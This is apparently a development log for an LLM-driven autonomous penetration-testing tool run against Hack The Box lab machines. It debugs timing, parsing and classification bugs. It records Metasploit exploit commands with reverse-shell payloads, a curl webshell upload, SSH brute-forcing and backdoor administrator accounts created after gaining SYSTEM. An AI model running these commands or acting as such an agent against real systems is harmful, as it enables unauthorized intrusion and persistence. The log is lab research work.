@@ -692,3 +692,606 @@ The prompt instructs `"wait": 15` for `exploit -j`, but we can't verify the LLM 
 4. **Classifier was 2/4 correct.** DCOM (FUNDAMENTAL ✓), MS08-067 (FUNDAMENTAL ✓), EternalBlue R1 (CORRECTABLE ✓), MS17-010 PSExec R2 (FUNDAMENTAL ✗ — poisoned by investigation bug).
 
 5. **No result data survived.** We spent $0.49 and an hour but have zero saved diagnostic files due to the Round 3 crash.
+
+---
+
+### Run 2 — 20:09 | Result: FALSE SUCCESS — 0/4 Chains Exploited (EternalBlue timing issue)
+
+**After fixing 4 bugs** (investigation search, crash handling, save safety, wait logging). **Used cached recon** (no `--fresh-scan`).
+
+4 chains generated: 2 exploitation, 2 recon-only.
+
+---
+
+#### Chain 1: MS17-010 Vulnerability Scanner (recon only)
+
+Ran `auxiliary/scanner/smb/smb_ms17_010` — confirmed target IS vulnerable:
+```
+[+] 10.129.21.59:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64
+```
+
+**Result:** Completed, but this is a scanner, not an exploit. No exploitation occurred.
+
+---
+
+#### Chain 2: EternalBlue SMB Exploit (ms17_010_eternalblue)
+
+**Steps:** Correct module, correct payload (`windows/x64/meterpreter/reverse_tcp`), correct LHOST (10.10.16.249), `exploit -j` with `wait: 15`.
+
+**What happened at `exploit -j`:**
+```
+[+] 10.129.21.59:445 - The target is vulnerable.
+[*] 10.129.21.59:445 - Connecting to target for exploitation.
+[+] 10.129.21.59:445 - Connection established for exploitation.
+[+] 10.129.21.59:445 - Target OS selected valid for OS indicated by SMB reply
+[+] 10.129.21.59:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.129.21.59:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.129.21.59:445 - Sending all but last fragment of exploit packet
+```
+
+**What happened at `sessions -l` (wait: 2):**
+```
+No active sessions.
+[*] 10.129.21.59:445 - Starting non-paged pool grooming  ← exploit STILL RUNNING
+[+] 10.129.21.59:445 - Sending SMBv2 buffers              ← exploit STILL RUNNING
+```
+
+The exploit was **still in progress** when `sessions -l` ran. The 15-second wait on `exploit -j` captured initial setup, but the kernel exploitation (grooming, buffer spraying) continued. The 2-second wait on `sessions -l` was too soon.
+
+**Validation:** `initial_access` FAILED — no "session opened" in output.
+
+---
+
+#### Chain 3: DCOM RPC (ms03_026_dcom)
+
+Same as Run 1. Target is Windows 7, exploit is for NT/2000/XP/2003. Failed with no session created.
+
+---
+
+#### Chain 4: Manual SMB Enumeration (recon only)
+
+Ran smbclient and rpcclient. SMB shares listed, RPC access denied. No exploitation.
+
+---
+
+#### Why it said "SUCCESS" (Bug #5)
+
+Chains 1 and 4 only have a `"reconnaissance"` stage. The chain classification code used loose matching:
+```python
+elif "privilege" in chain_success_stage.lower():
+    results["privilege_chains"].append(chain_name)
+else:  # "reconnaissance" fell through here!
+    results["persistence_chains"].append(chain_name)
+```
+"reconnaissance" didn't match "initial" or "privilege", so it fell into the `else` → `persistence_chains`. Then `has_any_success()` saw non-empty `persistence_chains` → broke the loop at Round 1 thinking it succeeded. **The feedback loop never ran.**
+
+---
+
+#### Bugs Exposed
+
+##### Bug #5: Recon-only chains falsely counted as exploitation success
+
+Any stage name that isn't "initial_access" or "privilege_escalation" falls into the `else` → `persistence_chains` → triggers `has_any_success()`. This means scanner/enumeration chains block the feedback loop by claiming success.
+
+##### Bug #6: EternalBlue timing confirmed
+
+The `exploit -j` output proves the exploit was still running during `sessions -l`. The LLM correctly set `wait: 15` for exploit and `wait: 2` for sessions, but the total ~17 seconds wasn't enough for EternalBlue's kernel exploitation (grooming + buffer spray).
+
+---
+
+#### Cost
+
+| Provider | Input Tokens | Output Tokens | Logged Cost |
+|----------|-------------|---------------|-------------|
+| OpenRouter (Recon) | 0 | 0 | $0.00 (cached) |
+| AnythingLLM (1 call) | 2,862 | 2,263 | $0.043 |
+| **Total** | **2,862** | **2,263** | **$0.043** |
+
+Cheapest run yet — cached recon + only 1 round (false success stopped the loop).
+
+---
+
+#### Key Takeaways
+
+1. **Bug #3 fix worked!** Result files saved despite the run having issues — `attack_chain_output_Blue_Danny_*.json` and `execution_output_Blue_Danny_*.json` both present. The `finally` block save worked.
+
+2. **Bug #4 fix worked!** Wait times now visible in logs, confirming `exploit -j` had `wait: 15` and `sessions -l` had `wait: 2`. This proved the timing hypothesis.
+
+3. **Recon chains must not count as exploitation success.** This is a critical logic bug that prevents the feedback loop from running.
+
+4. **EternalBlue needs a session retry mechanism.** The exploit works but takes longer than the initial wait. An automatic retry of `sessions -l` after additional wait would catch the session.
+
+---
+
+### Run 3 — 20:28 | Result: TRUE SUCCESS — 1/2 Chains (EternalBlue = SYSTEM)
+
+**After fixing 2 more bugs** (Bug #5: recon chains false success, Bug #6: session retry for slow exploits). **Used cached recon** (no `--fresh-scan`).
+
+2 chains generated: EternalBlue (correct) and DCOM (wrong OS target).
+
+---
+
+#### Chain 1: EternalBlue SMB Exploit (ms17_010_eternalblue) — SUCCESS
+
+**Steps executed (initial_access):**
+1. `msfconsole -q` → start_session → OK
+2. `use exploit/windows/smb/ms17_010_eternalblue` → OK
+3. `set RHOSTS 10.129.21.59` → OK
+4. `set RPORT 445` → OK
+5. `set PAYLOAD windows/x64/meterpreter/reverse_tcp` → OK
+6. `set LHOST 10.10.16.249` → OK (tun0 VPN IP)
+7. `set LPORT 4444` → OK
+8. `exploit -j` (wait: 15) → Started exploitation, "Exploit completed, but no session was created" (misleading MSF message)
+9. `sessions -l` (wait: 2) → Session 1 visible but without identity info yet
+
+**Bug #6 fix kicked in — session retry:**
+
+After `sessions -l`, session existed but the full "session opened" text wasn't in the output yet. The retry mechanism detected: (a) persistent session in use, (b) no terminal failure markers, (c) "meterpreter" found in output. Waited 20s and retried `sessions -l`.
+
+**Retry output confirmed full exploitation:**
+```
+[+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[+] =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Meterpreter session 1 opened (10.10.16.249:4444 -> 10.129.21.59:49159)
+
+Active sessions
+===============
+  Id  Type                     Information             Connection
+  1   meterpreter x64/windows  NT AUTHORITY\SYSTEM @   10.10.16.249:4444 ->
+                                HARIS-PC               10.129.21.59:49159
+  2   meterpreter x64/windows                          10.10.16.249:4444 ->
+                                                       10.129.21.59:49160
+```
+
+Two meterpreter sessions established. Session 1 shows **NT AUTHORITY\SYSTEM** — full SYSTEM-level access.
+
+**Steps executed (privilege_escalation):**
+10. `sessions -i <ID> -c 'whoami'` → MSF error: "Please specify valid session identifier(s)"
+
+The LLM generated literal `<ID>` as a placeholder instead of substituting actual session number `1`. MSF rejected the command. However, validation passed because the tmux buffer still contained `NT AUTHORITY\SYSTEM` from the earlier `sessions -l` output.
+
+**Steps executed (persistence):**
+11. `sessions -i <ID> -c 'net user hacker hackerpass /add'` → Same `<ID>` error
+12. `sessions -i <ID> -c 'net localgroup "Administrators" hacker /add'` → Same `<ID>` error
+13. Close session → OK
+14. `psexec.py WORKGROUP/hacker:hackerpass@10.129.21.59 whoami` → `zsh:1: command not found: psexec.py`
+
+Persistence commands all failed — `<ID>` placeholder not resolved, and `psexec.py` (impacket) not installed on Kali.
+
+**Overall status:** `completed`, `furthest_stage: "persistence"` (reached persistence stage even though commands didn't execute properly).
+
+---
+
+#### Chain 2: DCOM RPC Exploit (ms03_026_dcom) — FAILED
+
+Same as Run 1/2. Target is Windows 7, exploit targets NT/2000/XP/2003. "No active sessions."
+
+The retry mechanism correctly did NOT trigger here — `sessions -l` output contained "No active sessions" (a terminal failure indicator), so no retry was attempted.
+
+---
+
+#### Assessment: Is this a TRUE success?
+
+**YES — the EternalBlue exploitation is genuine.** Evidence:
+- `ETERNALBLUE overwrite completed successfully (0xC000000D)!` — kernel exploitation succeeded
+- `=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=` — MSF's signature success banner
+- `Meterpreter session 1 opened` with `NT AUTHORITY\SYSTEM @ HARIS-PC` — full SYSTEM shell
+- Two active meterpreter sessions (session 1 + session 2)
+
+The priv_esc and persistence stages had issues (literal `<ID>` placeholder, missing tools), but those are post-exploitation problems. The core objective — **gaining SYSTEM-level access via EternalBlue** — was achieved.
+
+---
+
+#### Minor Issues Noted (not bugs to fix now)
+
+1. **LLM uses literal `<ID>` placeholder**: The LLM generated `sessions -i <ID>` instead of `sessions -i 1`. The system has no mechanism to substitute session IDs from previous command output. This affects all post-exploitation commands that reference session numbers.
+
+2. **`psexec.py` not installed on Kali**: Impacket's `psexec.py` isn't in PATH. Fix: `pip install impacket` or use full path.
+
+3. **tmux buffer leaks into later stage validation**: The `NT AUTHORITY\SYSTEM` text from `initial_access` persisted in the tmux buffer, causing `privilege_escalation` to appear validated even though `whoami` never actually ran. This is a false positive in stage validation.
+
+---
+
+#### Cost
+
+| Provider | Input Tokens | Output Tokens | Logged Cost |
+|----------|-------------|---------------|-------------|
+| OpenRouter (Recon) | 0 | 0 | $0.00 (cached) |
+| AnythingLLM (1 call) | 2,862 | 1,702 | $0.034 |
+| **Total** | **2,862** | **1,702** | **$0.034** |
+
+Cheapest successful run — cached recon + only 1 round (genuine success in Round 1).
+
+---
+
+#### Key Takeaways
+
+1. **Bug #6 fix (session retry) was critical.** Without it, EternalBlue would have been declared failed (as in Run 1 and Run 2). The 20s retry gave the exploit time to complete kernel exploitation and establish the meterpreter session.
+
+2. **Bug #5 fix worked.** The recon-only chain issue from Run 2 is gone — this run only had exploitation chains.
+
+3. **All 6 bug fixes together made this possible:** Investigation search (Bug #1), crash handling (Bug #2), save safety (Bug #3), wait logging (Bug #4), recon chain classification (Bug #5), and session retry (Bug #6).
+
+4. **Blue is genuinely exploitable by PLANTE.** Score: 1/2 chains (50%). EternalBlue works, DCOM doesn't (wrong target OS).
+
+5. **Total cost across all 3 Blue runs:** ~$0.57 ($0.49 + $0.04 + $0.03). Most expensive was Run 1 (3 rounds + crash).
+
+---
+
+### Blue Summary Table
+
+| Run | Time | Chains | EternalBlue | DCOM | Scanner | Enum | Result | Bugs Fixed Before Run |
+|-----|------|--------|-------------|------|---------|------|--------|-----------------------|
+| 1 | 18:48 | 6 (3 rounds) | FAIL (timing) | FAIL (wrong OS) | N/A | N/A | CRASHED — 0% | Generalization audit |
+| 2 | 20:09 | 4 | FAIL (timing) | FAIL (wrong OS) | Completed | Completed | FALSE SUCCESS (recon = persistence bug) | +4 bug fixes |
+| 3 | 20:28 | 2 | **SYSTEM** | FAIL (wrong OS) | N/A | N/A | **TRUE SUCCESS — 50%** | +2 bug fixes |
+
+---
+
+## Legacy (Windows XP SP3)
+
+### Legacy Run 1 — 2026-02-10 21:21 (FAILED — 0/7 chains, 3 rounds)
+
+**Target**: 10.129.21.104 | **OS**: Windows XP | **Bugs fixed before run**: All 6 Blue bug fixes
+
+#### Results
+
+All 7 chains across 3 rounds FAILED:
+
+**Round 1:**
+- **Chain 1: MS08-067 NetAPI** — Used `TARGET 5` (SP0/SP1) instead of correct TARGET for SP3. Buffer overflow crashed Windows Server service (svchost.exe), making port 445 permanently unavailable.
+- **Chain 2: SMB Null Session** — Null session enumeration, not an exploit.
+
+**Round 2:**
+- **Chain 3: MS03-026 DCOM** — No session created (DCOM RPC payload mismatch).
+- **Chain 4: MS05-039 PnP** — Failed, no session.
+
+**Round 3:**
+- **Chain 5: MS06-040** — Failed, service already crashed from Round 1.
+- **Chain 6: MS04-011 LSASS** — Failed.
+- **Chain 7: SMB Enumeration** — Not an exploit.
+
+#### Key Finding: Investigation Bug
+
+The investigation step ran `nc -zv` to check if port 445 was open AFTER the MS08-067 exploit had already crashed the Windows Server service. Result: "port closed" → Classifier said FUNDAMENTAL → Remediation never ran for the main exploit.
+
+This is **Bug #7**: Investigation should check the exploit's own output for connection evidence before trusting post-exploit `nc` probes. The buffer overflow exploit DID connect to port 445 (it had to in order to send the exploit payload), but the service crashed as a result of the wrong TARGET offset.
+
+#### Token Usage
+
+| Provider | Input | Output | Cost |
+|----------|-------|--------|------|
+| AnythingLLM (8 calls) | 45,000 | 27,697 | $0.55 |
+| **Total** | **45,000** | **27,697** | **$0.55** |
+
+3 full feedback rounds = expensive. All AnythingLLM (no OpenRouter recon — cached).
+
+---
+
+### Legacy Run 2 — 2026-02-10 22:15 (FAILED — Bug #7 fix validated)
+
+**Target**: 10.129.21.104 | **OS**: Windows XP | **Bugs fixed before run**: +Bug #7 (port_open from exploit output)
+
+#### Results
+
+**Bug #7 fix WORKED**: MS08-067 was now correctly classified as **CORRECTABLE** (port_open = True from exploit output evidence). Remediation ran for the first time on Legacy.
+
+**But still failed**: Remediation changed `TARGET 5` to `TARGET 6` (SP2). Legacy is SP3, which needs TARGET 7. Close but still wrong. Also, the Windows Server service was already crashed from the first attempt in the same run, so even the correct TARGET wouldn't have helped without a box reset.
+
+**Round 1:**
+- **Chain 1: MS08-067** — TARGET 5 → crashed service → CORRECTABLE (port_open fix worked!) → Remediation set TARGET 6 → still wrong
+- **Chain 2: DCOM** — No session
+
+**Round 2:**
+- Feedback loop generated new chains but port 445 was already dead from Round 1
+
+#### Key Insight
+
+The LLM doesn't know which TARGET number maps to which OS version. It guesses, and the remediation also guesses. The real fix is to tell the LLM to use `TARGET 0` (Automatic) and let MSF auto-detect the OS.
+
+#### Token Usage
+
+| Provider | Input | Output | Cost |
+|----------|-------|--------|------|
+| AnythingLLM (8 calls) | 45,000 | 27,697 | $0.55 |
+| **Total** | **45,000** | **27,697** | **$0.55** |
+
+---
+
+### Legacy Run 3 — 2026-02-10 23:03 (TRUE SUCCESS — 1/2 chains, Round 1)
+
+**Target**: 10.129.21.145 (box reset) | **OS**: Windows XP | **Bugs fixed before run**: +Prompt fix (TARGET 0 for buffer overflows)
+
+#### Results
+
+**Both fixes together (Bug #7 + TARGET 0 prompt) = first-try SUCCESS.**
+
+**Chain 1: MS08-067 NetAPI Exploit on SMB** — **SYSTEM ACCESS + PERSISTENCE**
+
+The LLM used `TARGET 0` (Automatic) as instructed by the new prompt. MSF auto-detected:
+```
+Fingerprint: Windows XP - Service Pack 3 - lang:English
+Selected Target: Windows XP SP3 English (AlwaysOn NX)
+Attempting to trigger the vulnerability...
+Sending stage (188998 bytes) to 10.129.21.145
+Meterpreter session 1 opened (10.10.16.249:4444 -> 10.129.21.145:1032)
+```
+
+Session info: `NT AUTHORITY\SYSTEM @ LEGACY`
+
+- `whoami` failed — Windows XP doesn't have `whoami.exe` (minor issue, session info already shows SYSTEM)
+- `net user backdoor P@ssw0rd /add` → "The command completed successfully"
+- `net localgroup "Administrators" backdoor /add` → "The command completed successfully"
+
+**Chain 2: MS03-026 DCOM Exploit on MSRPC** — FAILED (no session created)
+
+#### Score: 1/2 chains (50%)
+
+#### Token Usage
+
+| Provider | Input | Output | Cost |
+|----------|-------|--------|------|
+| OpenRouter/Grok-4 (1 call) | 20,111 | 3,386 | $0.11 |
+| AnythingLLM (1 call) | 2,899 | 1,675 | $0.03 |
+| **Total** | **23,010** | **5,061** | **$0.14** |
+
+Cheapest successful run yet — only 1 round, 2 API calls.
+
+---
+
+#### Key Takeaways
+
+1. **TARGET 0 (Automatic) prompt fix was critical.** Without it, the LLM guessed wrong TARGET numbers twice (5, then 6), crashing the target service irreversibly.
+
+2. **Bug #7 fix (port_open from exploit output) was validated in Run 2.** Investigation now correctly determines the port was open when the exploit ran, even if the exploit crashed the service afterward.
+
+3. **Buffer overflow exploits are one-shot.** Wrong TARGET = service crash = no retry without box reset. This makes TARGET 0 essential.
+
+4. **whoami.exe missing on Windows XP.** The session info (`NT AUTHORITY\SYSTEM @ LEGACY`) already proves SYSTEM access, so this is cosmetic.
+
+5. **Total cost across 3 Legacy runs:** $1.24 ($0.55 + $0.55 + $0.14). Runs 1 and 2 were expensive (3 rounds each) due to wrong TARGET.
+
+---
+
+### Legacy Summary Table
+
+| Run | Time | Chains | MS08-067 | DCOM | Result | Bugs Fixed Before Run |
+|-----|------|--------|----------|------|--------|-----------------------|
+| 1 | 21:21 | 7 (3 rounds) | FAIL (TARGET 5 = wrong offset) | FAIL | FAILED — 0% | 6 Blue bug fixes |
+| 2 | 22:15 | 4+ (3 rounds) | FAIL (TARGET 6 = still wrong) | FAIL | FAILED — 0% (Bug #7 fix validated) | +Bug #7 |
+| 3 | 23:03 | 2 | **SYSTEM** (TARGET 0 = auto) | FAIL | **TRUE SUCCESS — 50%** | +TARGET 0 prompt |
+
+---
+
+## Jerry (Windows Server 2012 R2 — Apache Tomcat 7.0.88)
+
+### Jerry Run 1 — 2026-02-10 23:29 (FAILED — 0/6 chains, 3 rounds)
+
+**Target**: 10.129.136.9 | **OS**: Windows | **Cost**: $0.64 (9 API calls)
+
+This box exposes the MSF-only limitation. Jerry is a **web-app box**: the intended path is to discover credentials from Tomcat's default error page (`tomcat:s3cret`), then upload a WAR webshell via `/manager/html`. PLANTE never scraped the web page, so it never found the real password.
+
+#### Round 1 — MSF Default Creds + JSP Upload
+
+**Chain 1: Tomcat Manager Upload with Default Credentials**
+- Module: `exploit/multi/http/tomcat_mgr_upload`
+- Used `HttpUsername=tomcat`, `HttpPassword=tomcat` — **WRONG CREDS**
+- Result: `"Exploit aborted due to failure: Unable to access the Tomcat Manager"`
+- The actual password is `s3cret`, visible on the Tomcat default error page
+- Classification: **FUNDAMENTAL** (correct — can't access manager with wrong creds)
+
+**Chain 2: Tomcat JSP Upload Bypass (CVE-2017-12615)**
+- Module: `exploit/multi/http/tomcat_jsp_upload_bypass`
+- Used `java/meterpreter/reverse_tcp` payload
+- Result: `"java/meterpreter/reverse_tcp is not a compatible payload"`
+- Classification: **CORRECTABLE** (correct — wrong payload type)
+
+#### Round 2 — Manual PUT Upload + Credential Guessing
+
+**Chain 1: Manual JSP Webshell Upload via PUT Bypass (CVE-2017-12615)**
+- Used `curl -T /tmp/shell.jsp 'http://target:8080/shell.jsp/'`
+- curl appended filename to path → requested `/shell.jsp/shell.jsp` → 404
+- Also: CVE-2017-12615 doesn't apply to Tomcat 7.0.88 (patched after 7.0.81)
+- Classification: **CORRECTABLE**
+
+**Chain 2: Credential Guessing and Manual WAR Upload**
+- Tried to create WAR with `jar` command — **not found** (no JDK on Kali)
+- Credential list: `admin:admin, admin:tomcat, tomcat:admin, admin:, manager:manager, root:root, tomcat:` — **none include `s3cret`**
+- Python upload script ran with no WAR file → silent failure (no output)
+- Classification: **CORRECTABLE** (missing dependency)
+
+#### Round 3 — Corrected PUT + Ghostcat
+
+**Chain 1: Corrected Manual JSP Upload via PUT (python3)**
+- Used `python3 -c '...; with open(...) ...'` — **syntax error** (`with` can't share a line with other statements in `-c` mode)
+- Even if syntax worked, Tomcat 7.0.88 is not vulnerable to CVE-2017-12615
+- Classification: **FUNDAMENTAL** (correct — version not vulnerable)
+
+**Chain 2: Tomcat Ghostcat AJP File Read (CVE-2020-1938)**
+- **Closest to working!** Tried to read `/conf/tomcat-users.xml` via AJP port 8009
+- Used `auxiliary/admin/http/tomcat_ghostcat` with `set TARGETFILE /conf/tomcat-users.xml`
+- MSF warned: `"Unknown datastore option: TARGETFILE"` (wrong option name)
+- Module ran against target but no credential output captured
+- Stage was `reconnaissance` → wouldn't count as access even if it worked
+- If this had succeeded, it would have discovered `tomcat:s3cret` and enabled Round 4... but max rounds = 3
+
+#### Root Cause Analysis
+
+**This is NOT a code bug — it's a fundamental limitation of the MSF-only approach.**
+
+Jerry requires **web-app-level discovery**:
+1. Browse `http://target:8080/` → default Tomcat page shows creds in the 401 error
+2. Login to `/manager/html` with `tomcat:s3cret`
+3. Upload WAR webshell
+
+PLANTE never fetches web pages to extract information. It jumps straight to exploit modules and guesses common default credentials. The credential list (`tomcat:tomcat`, `admin:admin`, etc.) doesn't include `s3cret`.
+
+**What would fix this (future work):**
+- Web page scraping as a recon step (feed page content to LLM)
+- Broader credential brute-forcing with tools like `hydra`
+- Working Ghostcat module to extract `tomcat-users.xml`
+- Non-MSF approaches: manual `curl` with credential enumeration
+
+#### Token Usage
+
+| Provider | Input | Output | Cost |
+|----------|-------|--------|------|
+| OpenRouter/Grok-4 (1 call) | 30,440 | 4,385 | $0.16 |
+| AnythingLLM (8 calls) | 38,281 | 24,809 | $0.49 |
+| **Total** | **68,721** | **29,194** | **$0.64** |
+
+---
+
+### Jerry Summary Table
+
+| Run | Time | Chains | Tomcat Manager | CVE-2017-12615 | Ghostcat | Result | Notes |
+|-----|------|--------|----------------|----------------|----------|--------|-------|
+| 1 | 23:29 | 6 (3 rounds) | FAIL (wrong creds) | FAIL (wrong version + payload) | FAIL (wrong option) | FAILED — 0% | Web-app discovery limitation |
+
+---
+
+## Nibbles (Ubuntu Linux — Apache 2.4.18 + NibbleBlog CMS)
+
+### Nibbles Run 1 — 2026-02-11 00:44 (FAILED — 0/5 chains, 3 rounds)
+
+**Target**: 10.129.21.170 | **OS**: Linux | **Cost**: $0.30 (7 AnythingLLM calls, recon cached from earlier failed attempt)
+
+Another web-app box. The intended attack path is through NibbleBlog CMS (`/nibbleblog/`), discovered via an HTML comment. PLANTE found the comment in Round 3 but ran out of rounds to act on it.
+
+#### Round 1 — Parsing failure (BUG)
+
+The LLM generated a valid Shellshock attack chain, but **JSON parsing failed** in `extract_json_from_llm_response()`. The function fell back to `{"raw_output": ...}` which has no `attack_chains` field. The orchestrator skipped execution entirely for this round.
+
+The raw JSON is visible in `attack_chain_output` — it was a valid response that just couldn't be extracted. Entire round wasted with no feedback data collected.
+
+#### Round 2 — Wrong exploit + missing wordlist
+
+**Chain 1: Shellshock RCE via Apache mod_cgi**
+- Module: `exploit/multi/http/apache_mod_cgi_bash_env_exec`
+- Payload: `cmd/unix/reverse_bash` — **"not a compatible payload"**
+- Also: Nibbles is NOT vulnerable to Shellshock. The box runs NibbleBlog CMS, not CGI scripts.
+- Classification: **CORRECTABLE** (incompatible payload)
+
+**Chain 2: SSH Brute Force with rockyou.txt**
+- `hydra -l ubuntu -P /usr/share/wordlists/rockyou.txt ...`
+- `rockyou.txt` not found — it's compressed as `.gz` on Kali by default
+- Classification: N/A (failed before any real attempt)
+
+#### Round 3 — Key discovery, but too late
+
+**Chain 1: Web Content Retrieval (curl)**
+- Fetched `http://target/index.html`
+- Output: `<b>Hello world!</b>` + **`<!-- /nibbleblog/ directory. Nothing interesting here! -->`**
+- **THIS IS THE KEY CLUE** — reveals the hidden NibbleBlog CMS directory
+- But this was a `reconnaissance` stage in the final round — no Round 4 to act on it
+
+**Chain 2: Extended Gobuster**
+- Scanned `/` with `common.txt` wordlist — `nibbleblog` not in wordlist, found nothing new
+- If it had used `directory-list-2.3-medium.txt`, it would have found `/nibbleblog/`
+
+**Chain 3: SSH Common Credentials Check**
+- Custom bash script tried 30 user:pass combos (root, admin, ubuntu, nibbler + common passwords)
+- `sshpass` worked this time (unlike earlier runs)
+- No valid credentials found — SSH isn't the attack vector
+
+#### The actual attack path for Nibbles
+
+1. Find `/nibbleblog/` via HTML comment in `index.html` (Round 3 **did find this**)
+2. Browse `/nibbleblog/admin.php` → login with `admin:nibbles`
+3. Upload PHP reverse shell via the "My image" plugin (file upload vulnerability)
+4. Shell as `nibbler` → privesc via sudo on a zip script
+
+#### Root Cause Analysis
+
+**Three problems:**
+
+1. **Round 1 parsing bug** — `extract_json_from_llm_response()` failed to parse valid JSON, returning `{"raw_output": ...}` instead. Wasted a full round with zero feedback data.
+
+2. **Wrong vulnerability identified** — LLM saw Apache 2.4.18 and guessed Shellshock (CVE-2014-6271). The actual vulnerability is in NibbleBlog CMS, not Apache itself. Without discovering `/nibbleblog/`, the LLM had no way to know.
+
+3. **Feedback loop ran out of rounds** — The `curl index.html` in Round 3 found `/nibbleblog/`, but max rounds = 3. If there had been a Round 4, the feedback loop would have fed this discovery back and the LLM could have generated chains targeting the CMS admin panel.
+
+**What would fix this (future work):**
+- Add `curl` of the homepage to the initial recon phase (would find the comment in Round 1)
+- Use larger gobuster wordlist (`medium` instead of `common`)
+- Web-app attack chains: CMS login + file upload (non-MSF)
+
+#### Token Usage
+
+| Provider | Input | Output | Cost |
+|----------|-------|--------|------|
+| AnythingLLM (7 calls) | 24,295 | 14,901 | $0.30 |
+| **Total** | **24,295** | **14,901** | **$0.30** |
+
+Recon was cached from earlier failed attempt (Grok-4 502 error), so no OpenRouter cost.
+
+---
+
+### Nibbles Summary Table
+
+| Run | Time | Chains | Shellshock | SSH Brute | Web Recon | Result | Notes |
+|-----|------|--------|------------|-----------|-----------|--------|-------|
+| 1 | 00:44 | 5 (3 rounds) | FAIL (wrong payload + not vulnerable) | FAIL (rockyou.txt missing) | Found `/nibbleblog/` in R3 (too late) | FAILED — 0% | Parsing bug + web-app limitation |
+
+---
+
+## Optimum (Windows Server 2012 R2 — HttpFileServer 2.3)
+
+### Optimum Run 1 — 2026-02-11 10:50 (PARTIAL SUCCESS — user shell, no SYSTEM)
+
+**Target**: 10.129.1.34 | **OS**: Windows | **Cost**: $0.14 (2 API calls) | **Round 1 only**
+
+First-try success on initial access. PLANTE identified CVE-2014-6287, selected the correct MSF module, and got a meterpreter session on the first attempt. However, the shell was as `kostas` (regular user), not SYSTEM, and no privilege escalation was attempted.
+
+#### Round 1 — 2 chains
+
+**Chain 1: Metasploit Rejetto HFS Exec Exploit** — **USER SHELL ACHIEVED**
+
+- Module: `exploit/windows/http/rejetto_hfs_exec`
+- Payload: `windows/meterpreter/reverse_tcp`
+- Meterpreter session 1 opened: `OPTIMUM\kostas @ OPTIMUM`
+- `whoami` → `optimum\kostas` (regular user, NOT SYSTEM)
+
+The exploit worked perfectly. HFS 2.3 is vulnerable to CVE-2014-6287 (null byte command injection). MSF sends a malicious search query, hosts a VBS payload on a temp HTTP server, target downloads and executes it, meterpreter connects back.
+
+**Why no SYSTEM?** HFS runs as the user who started it (`kostas`), not as a system service. Unlike EternalBlue/MS08-067 which exploit kernel-level services and give SYSTEM directly, this is an application-level exploit that inherits the application's user context.
+
+**Why no privesc attempted?** The priv_esc stage only ran `whoami` to CHECK privileges — it didn't run a second exploit to ESCALATE. The LLM assumed the exploit would give SYSTEM (like Blue/Legacy), so the chain design was: exploit → check whoami → add backdoor user. When `whoami` returned `kostas` (not SYSTEM), the `net user` persistence commands would have failed (kostas can't create admin users).
+
+The real privesc for Optimum is MS16-032 (secondary logon handle privilege escalation), which requires running `systeminfo` → Windows Exploit Suggester → kernel exploit. PLANTE's current chain template doesn't support multi-exploit chains.
+
+**Chain 2: Direct Python Exploit for HFS RCE** — FAILED
+
+- Attempted raw socket HTTP request with CVE-2014-6287 payload
+- Python syntax error: nested quotes in `python3 -c` one-liner broke parsing
+- Interesting that the LLM tried a non-MSF approach — shows prompt guidance working
+
+#### Score: 1/2 chains — partial (user shell, no SYSTEM, no persistence)
+
+PLANTE marked this as `"final_result": "SUCCESS"` because a session opened, but it's really partial — got user access but no privilege escalation or persistence. On HTB this gets `user.txt` but not `root.txt`.
+
+#### Root Cause: Missing multi-stage exploitation
+
+PLANTE's attack chain template treats privesc as "check if already admin." For boxes where the initial exploit gives a low-privilege shell, the system needs a **two-exploit chain**:
+1. First exploit → user shell
+2. `systeminfo` → identify kernel vulns → second exploit → SYSTEM
+
+This is a design limitation, not a bug. Future work: add kernel exploit suggestion after initial access.
+
+#### Token Usage
+
+| Provider | Input | Output | Cost |
+|----------|-------|--------|------|
+| OpenRouter/Grok-4 (1 call) | 18,963 | 3,446 | $0.11 |
+| AnythingLLM (1 call) | 2,311 | 1,524 | $0.03 |
+| **Total** | **21,274** | **4,970** | **$0.14** |
+
+Cheapest run — only 2 API calls, Round 1 success.
+
+---
+
+### Optimum Summary Table
+
+| Run | Time | Chains | HFS Rejetto | Python Direct | Result | Notes |
+|-----|------|--------|-------------|---------------|--------|-------|
+| 1 | 10:50 | 2 | **kostas** (user shell) | FAIL (syntax error) | **PARTIAL — user shell, no SYSTEM** | Multi-stage privesc needed |
